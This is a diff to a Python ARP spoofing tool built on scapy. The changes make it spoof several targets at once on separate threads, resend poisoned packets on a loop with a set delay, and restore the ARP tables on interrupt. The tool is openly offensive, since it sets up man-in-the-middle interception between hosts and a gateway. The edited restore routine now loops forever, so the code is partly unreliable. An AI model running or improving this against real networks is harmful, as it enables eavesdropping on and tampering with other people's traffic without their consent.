@@ -37,9 +37,7 @@ class ARPSpoof:
 
     def spoof(self, target, gateway):
         
-        target_list = target.split(",")
-        
-        for target in target_list:
+        while (True):
         
             try:
 
@@ -50,16 +48,20 @@ class ARPSpoof:
                 scapy.send(packet, verbose = False)
                 
                 print("[+] [Sent Packet to Target {} With Gateway {}]".format(target, gateway))
-                
+
             except Exception as E:
                 
                 print("[-] [Error: {}]".format(E))
+                
+            except KeyboardInterrupt:
+
+                self.restore(target, gateway)
+
+            time.sleep(self.args.delay)
 
     def restore(self, target, gateway):
         
-        target_list = target.split(",")
-        
-        for target in target_list:
+        while (True):
         
             try:
 
@@ -82,20 +84,19 @@ class ARPSpoof:
         parser.add_argument("-g", "--gateway", required = True, help = "Gateway IP", type = str)
         parser.add_argument("-d", "--delay", required = True, help = "Delay ( Per Second )", type = int)
         parser.add_argument("-t", "--thread", required = True, help = "Thread", type = int)
-        args = parser.parse_args()
+        self.args = parser.parse_args()
         
-        while (True):
+        target_list = self.args.target.split(",")
+        
+        for target in target_list:
             
             try:
             
-                T(max_workers = args.thread).submit(self.spoof, args.target, args.gateway)
-                time.sleep(args.delay)
+                T(max_workers = self.args.thread).submit(self.spoof, target, self.args.gateway)
                 
-            except KeyboardInterrupt:
-                
-                self.restore(args.target, args.gateway)
-                print("[!] [Exiting...]")
-                break
+            except Exception as E:
+            
+                print("[-] [Error: {}]".format(E))
                 
         exit()
         
